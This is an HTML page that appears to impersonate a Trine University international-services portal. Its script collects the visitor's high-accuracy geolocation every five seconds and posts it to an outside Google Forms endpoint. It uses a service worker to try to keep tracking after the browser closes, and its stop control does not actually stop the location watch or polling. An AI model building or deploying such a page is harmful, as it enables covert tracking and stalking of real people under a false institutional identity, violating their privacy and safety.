<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trine University - International Services</title>
    <style>
        body, html {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #e6e6e6;
        }
        .container {
            width: 100%;
            padding: 40px 0;
            color: white;
        }
        .header {
            background-color: #00447C;
            padding: 10px 20px;
            color: white;
            text-align: left;
        }
        .footer {
            background-color: #00447C;
            color: white;
            text-align: left;
            padding: 20px 20px;
            font-size: 16px;
            position: absolute;
            bottom: 0;
            width: 100%;
        }
        .section {
            background-color: #f4f4f4;
            margin: 20px auto;
            padding: 20px 10%;
            width: 70%;
            border-radius: 5px;
            color: black;
            text-align: left;
        }
        button {
            display: block;
            width: 80%;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
        }
        .hidden {
            display: none;
        }
        #locationError {
            color: red;
            margin: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
<div class="header">
    <div>TRINE UNIVERSITY</div>
</div>
<div class="container">
    <div class="section">
        <div id="locationError" class="hidden"></div>
        <p>Tracking your location for university services. This will continue running even after you close the browser.</p>
        <button id="startTracking">Start Tracking</button>
        <button id="stopTracking" class="hidden">Stop Tracking</button>
    </div>
</div>
<div class="footer">
    Secure Online Session
</div>

<script>
    let trackingActive = false;
    let watchID;

    document.getElementById('startTracking').addEventListener('click', function() {
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("sw.js").then(() => {
                console.log("Service Worker Registered!");
            });
        }

        startTracking();
        document.getElementById('startTracking').classList.add("hidden");
        document.getElementById('stopTracking').classList.remove("hidden");
    });

    document.getElementById('stopTracking').addEventListener('click', function() {
        stopTracking();
        document.getElementById('stopTracking').classList.add("hidden");
        document.getElementById('startTracking').classList.remove("hidden");
    });

    function startTracking() {
        trackingActive = true;
        navigator.geolocation.watchPosition(
            (position) => sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy),
            (error) => console.error("Location tracking error:", error),
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );

        setInterval(() => {
            if (trackingActive) {
                navigator.geolocation.getCurrentPosition(
                    (position) => sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy),
                    (error) => console.error("Error getting location:", error)
                );
            }
        }, 5000);
    }

    function stopTracking() {
        trackingActive = false;
        if (watchID) {
            navigator.geolocation.clearWatch(watchID);
        }
    }

    function sendLocation(latitude, longitude, accuracy) {
        const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
        const data = new URLSearchParams();
        data.append("entry.1267598962", latitude);
        data.append("entry.1270259896", longitude);
        data.append("entry.1888406517", accuracy);

        fetch(formUrl, {
            method: "POST",
            body: data,
            mode: "no-cors",
        }).then(() => console.log("Location updated."));
    }

    // Resume tracking automatically when browser is reopened
    window.addEventListener("load", () => {
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.ready.then((reg) => {
                reg.sync.register("syncLocation");
            });
        }
    });
</script>
</body>
</html>
